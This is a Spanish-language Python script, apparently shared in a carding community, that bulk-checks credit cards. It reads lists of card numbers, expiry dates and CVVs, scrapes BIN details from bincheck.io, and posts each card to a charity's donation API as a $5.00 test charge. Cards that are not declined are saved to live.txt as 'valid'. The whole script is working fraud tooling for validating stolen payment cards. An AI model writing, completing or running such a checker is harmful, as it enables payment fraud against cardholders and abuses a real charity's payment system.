# Código hecho por Izan's Lab
#  GitHub: https://github.com/IZANTAR
#  Telegram: 💳 ESCUELA BINS Y CCS SOLO AMIGOS 💸
#  Fecha de creación del checker: 11/06/2025

import requests, time
from datetime import datetime
from bs4 import BeautifulSoup
from pathlib import Path
from sys import argv

global R,B,C,G,Y,Q
R='\033[1;31m';B='\033[1;34m';C='\033[1;37m';G='\033[1;32m';Y='\033[1;33m';Q='\033[1;36m'

def bincheck(cc):
    url = f"https://bincheck.io/en/details/{cc}"
    response = requests.get(url)
    soup = BeautifulSoup(response.content, 'lxml')
    data = {}
    for row in soup.find_all('tr'):
        cells = row.find_all('td')
        if len(cells) == 2:
            key = cells[0].get_text(strip=True)
            value = cells[1].get_text(strip=True)
            data[key] = value
    card_info = f"""
    > BIN/IIN: {B}{data.get('BIN/IIN', 'No encontrado')}{C}
    > Marca de tarjeta: {B}{data.get('Card Brand', 'No encontrado')}{C}
    > Tipo de tarjeta: {B}{data.get('Card Type', 'No encontrado')}{C}
    > Nivel de tarjeta: {B}{data.get('Card Level', 'No encontrado')}{C}
    > Banco emisor: {B}{data.get('Issuer Name / Bank', '------')}{C}
    > País: {B}{data.get('ISO Country Name', 'No encontrado')}{C}
    """
    return card_info

def braintree(numero, mes, anio, cvv, espera):
    try:
        headers = {
            # (Headers conservados, no necesitan traducción)
        }
        data = {
            # (Datos conservados, no necesitan traducción)
            "card_number": numero,
            "card_exp_date_month": mes,
            "card_exp_date_year": anio,
            "card_cvv": cvv,
            # Resto igual
        }
        time.sleep(espera)
        respuesta = requests.post("https://secure.fredhutch.org/site/CRDonationAPI", headers=headers, data=data)
        return respuesta
    except Exception as e:
        return 'Error de excepción: ', e

def start():
    if len(argv) < 2:
        return print('\nChecker de tarjetas por Izan\'s Lab\n\nFormato: número|mes|año|cvv\nEjemplo: 6011014595997102|02|2027|720\n\nUso: python braintree.py list.txt')

    vivas = 0
    muertas = 0

    archivo = argv[1]
    file = Path(__file__).with_name(archivo)
    tarjetas = [i.strip() for i in file.open('r').readlines()]

    ahora = datetime.now()
    mes_actual = ahora.month
    anio_actual = ahora.year

    espera = int(argv[2]) if len(argv) > 2 else 5

    try:
        for cc in tarjetas:
            campos = cc.strip().split('|')
            numero, mes, anio, cvv = campos

            if len(anio) == 2:
                anio = f"20{anio}"

            if int(anio) < anio_actual:
                muertas += 1
            elif int(anio) == anio_actual and int(mes) <= mes_actual:
                muertas += 1
            elif len(numero) > 16:
                muertas +=1
            else:
                try:
                    detalles = bincheck(numero)
                    respuesta = braintree(numero, mes, anio, cvv, espera)

                    mapa_respuestas = {
                        'CARD_DECLINED': '%sRechazada%s'%(R,C),
                        'FIELD_VALIDATION': '%sError de validación%s'%(R,C),
                        'UNSPECIFIED':'%sAño de expiración inválido%s'%(R,C),
                        'CVV': '%sCVV inválido%s'%(R,C),
                        'CVC': '%sCVC inválido%s'%(R,C)
                    }
                    razon = next((razon for clave, razon in mapa_respuestas.items() if clave in respuesta.text), '%sViva%s'%(G,C))

                    if 'Viva' in razon:
                        vivas += 1
                        open('live.txt', 'a').write('\nTARJETA VÁLIDA: ' + cc + ' | Créditos: https://github.com/IZANTAR')
                        color = G
                    else:
                        muertas += 1
                        color = R

                    print('-| Tarjeta: %s%s%s | Monto: %s5.00 USD%s | Respuesta: %s %s'%(color, cc, C, Q, C, razon, detalles))
                except Exception as e:
                    print(f'Error procesando tarjeta: {e}')

            print(f"\033]0; Vivas: {vivas}  |  Muertas: {muertas}  | Restantes: {len(tarjetas) - muertas - vivas}\a", end='', flush=True)
    except KeyboardInterrupt:
        pass

    print(f'\n-| {Q}Revisadas{C}: {Q}{vivas + muertas}{C}\n  > {B}Total tarjetas{C}: {B}{len(tarjetas)}{C}\n  > {G}Vivas{C}: {G}{vivas}{C}\n  > {R}Muertas{C}: {R}{muertas}{C}')

if __name__ == '__main__':
    start()
